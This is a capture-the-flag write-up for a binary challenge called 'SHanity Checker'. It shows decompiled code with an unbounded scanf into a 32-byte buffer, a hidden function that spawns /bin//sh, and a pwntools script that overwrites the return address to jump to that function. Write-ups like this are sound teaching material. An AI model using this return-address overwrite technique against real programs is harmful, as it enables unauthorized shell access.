# SHanity Checker

## File Analysis

![image](https://github.com/user-attachments/assets/4ae144de-598e-4de4-b8e0-26f1b59e4e77)

## Step to Solve:
## Step 1:

Use **Ghidra** to decompile the file. 

_**Decompile Code**_

<details>
  
<summary>main</summary>

```C
undefined8 main(void)

{
  undefined local_28 [32];
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  printf("Hello, whats your name?\n>> ");
  __isoc99_scanf(&%s,local_28);
  return 0;
}

```
</details>

<details>
  
<summary>FUN_00401174</summary>

```C
undefined  [16] FUN_00401174(void)

{
  syscall();
  return ZEXT816(0);
}

```

</details>

## Step 2

![image](https://github.com/user-attachments/assets/1c8f3695-9a71-4f14-bbe8-ee55c78c2f40)


One interesting thing in this FUN_00401174 assembly is that, we can notice one weird hex value have been mov to RBX. So I just use **CyberChef** to see what is that value about and just found some cool thing, which is **/bin//sh**.

![image](https://github.com/user-attachments/assets/bb234ee7-9b36-45e9-b4d3-802c2a42b7d8)

## Step 3

So at this point, I pretty sure that is just a simply **Buffer Overflow**, because that when we call that FUN_00401174, it will spawn a shell. And the main function **scanf** not specifying any size to be input to the buffer. Therefore, we can modify the **return address** to the FUN_00401174.

<details>
  <summary>Exploit Script</summary>

```python
from pwn import *

exe = context.binary = ELF('./chal')

p = exe.process()

offset = 0x28
vuln_address = 0x4011ac
payload = b"A" * 0x28 + p64(vuln_address)

p.sendlineafter(b">> ", payload)

p.interactive()
```
  
</details>

> ![image](https://github.com/user-attachments/assets/2820c5ae-51b0-49e3-9680-082bd2a09422)


